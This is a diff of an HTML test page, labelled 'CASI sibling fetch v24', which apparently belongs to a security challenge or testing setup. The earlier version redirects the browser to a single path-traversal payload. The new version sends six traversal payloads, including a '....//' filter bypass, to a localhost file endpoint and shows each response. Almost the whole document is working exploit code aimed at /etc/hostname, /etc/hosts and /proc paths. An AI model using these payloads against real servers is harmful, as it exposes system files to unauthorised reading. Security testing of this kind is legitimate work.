@@ -1,10 +1,4 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI sibling path router v23</title><script>
-const t=[
-['/etc/hostname'],
-['../../../../etc/hostname'],
-['../../../../../../../../etc/hostname'],
-['../../../../../../../../etc/hosts'],
-['/proc/self/root/etc/hostname']];
-const q=new URLSearchParams(location.search),i=Math.abs(Number(q.get('veh_id')||0))%t.length,n=t[i][0];
-document.title='CASI v23 '+i;setTimeout(()=>location.replace('http://127.0.0.1:8080/file?name='+encodeURIComponent(n)),100);
-</script></head><body>CASI v23 selected sibling path</body></html>
+<!doctype html><html><head><meta charset="utf-8"><title>CASI sibling fetch v24</title><style>body{font:14px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:8px}</style></head><body><h1>Sibling localhost file results</h1><div id="o"></div><script>
+const t=[['abs-hostname','/etc/hostname'],['d4-hostname','../../../../etc/hostname'],['d8-hostname','../../../../../../../../etc/hostname'],['d8-hosts','../../../../../../../../etc/hosts'],['proc-hostname','/proc/self/root/etc/hostname'],['dotdot-hostname','....//....//....//....//etc/hostname']];
+(async()=>{for(const [l,n] of t){let s='';const c=new AbortController(),q=setTimeout(()=>c.abort(),5000);try{const r=await fetch('http://127.0.0.1:8080/file?name='+encodeURIComponent(n),{cache:'no-store',signal:c.signal});const b=await r.text();s=l+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' DISPOSITION='+r.headers.get('content-disposition')+' BODY='+JSON.stringify(b.slice(0,1200));}catch(e){s=l+' ERROR='+e.name+':'+e.message}clearTimeout(q);const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}})();
+</script></body></html>
